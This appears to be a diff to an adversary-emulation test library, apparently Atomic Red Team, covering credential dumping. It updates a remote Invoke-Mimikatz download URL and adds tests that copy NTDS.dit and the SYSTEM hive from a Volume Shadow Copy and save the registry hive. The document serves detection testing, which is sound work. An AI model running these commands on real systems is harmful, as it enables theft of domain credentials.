@@ -12,7 +12,7 @@ atomic_tests:
     remote_script:
       description: URL to a remote Mimikatz script that dumps credentials
       type: Url
-      default: https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
+      default: https://raw.githubusercontent.com/EmpireProject/Empire/dev/data/module_source/credentials/Invoke-Mimikatz.ps1
   executor:
     name: powershell
     command: |
@@ -58,7 +58,7 @@ atomic_tests:
 
 - name: Dump LSASS.exe Memory using ProcDump
   description: |
-    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals 
+    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
     ProcDump. The tool may be downloaded from https://docs.microsoft.com/en-us/sysinternals/downloads/procdump.
   supported_platforms:
     - windows
@@ -74,7 +74,7 @@ atomic_tests:
 
 - name: Dump LSASS.exe Memory using Windows Task Manager
   description: |
-    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task 
+    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task
     Manager and administrative permissions.
   supported_platforms:
     - windows
@@ -82,11 +82,11 @@ atomic_tests:
     name: manual
     steps: |
       1. Open Task Manager:
-        On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking 
+        On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking
         on the task bar and selecting "Task Manager".
 
       2. Select lsass.exe:
-        If lsass.exe is not visible, select "Show processes from all users". This will allow you to observe execution of lsass.exe 
+        If lsass.exe is not visible, select "Show processes from all users". This will allow you to observe execution of lsass.exe
         and select it for manipulation.
 
       3. Dump lsass.exe memory:
@@ -95,7 +95,7 @@ atomic_tests:
 
 - name: Offline Credential Theft With Mimikatz
   description: |
-    The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with 
+    The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with
     Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz.
   supported_platforms:
     - windows
@@ -118,8 +118,8 @@ atomic_tests:
 
 - name: Dump Active Directory Database with NTDSUtil
   description: |
-    The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability 
-    uses the "IFM" or "Install From Media" backup functionality that allows Active Directory restoration or installation of 
+    The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability
+    uses the "IFM" or "Install From Media" backup functionality that allows Active Directory restoration or installation of
     subsequent domain controllers without the need of network-based replication.
   supported_platforms:
     - windows
@@ -132,3 +132,43 @@ atomic_tests:
     name: command_prompt
     command: |
       ntdsutil “ac i ntds” “ifm” “create full #{output_folder} q q
+
+- name: Create Volume Shadow Copy with NTDS.dit
+  description: |
+    The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
+  supported_platforms:
+    - windows
+  input_arguments:
+    drive_letter:
+      description: Drive letter to source VSC (including colon)
+      type: String
+      default: "C:"
+  executor:
+    name: command_prompt
+    command: |
+      vssadmin.exe create shadow /for=#{drive_letter}
+
+- name: Copy NTDS.dit from Volume Shadow Copy
+  description: |
+    The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
+
+    This test requires steps taken in the test "Create Volume Shadow Copy with NTDS.dit".
+    A successful test also requires the export of the SYSTEM Registry hive. 
+    This test must be executed on a Windows Domain Controller.
+  supported_platforms:
+    - windows
+  input_arguments:
+    vsc_name:
+      description: Name of Volume Shadow Copy
+      type: String
+      default: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+    extract_path:
+      description: Path for extracted NTDS.dit
+      type: Path
+      default: C:\Extract
+  executor:
+    name: command_prompt
+    command: |
+      copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
+      copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
+      reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
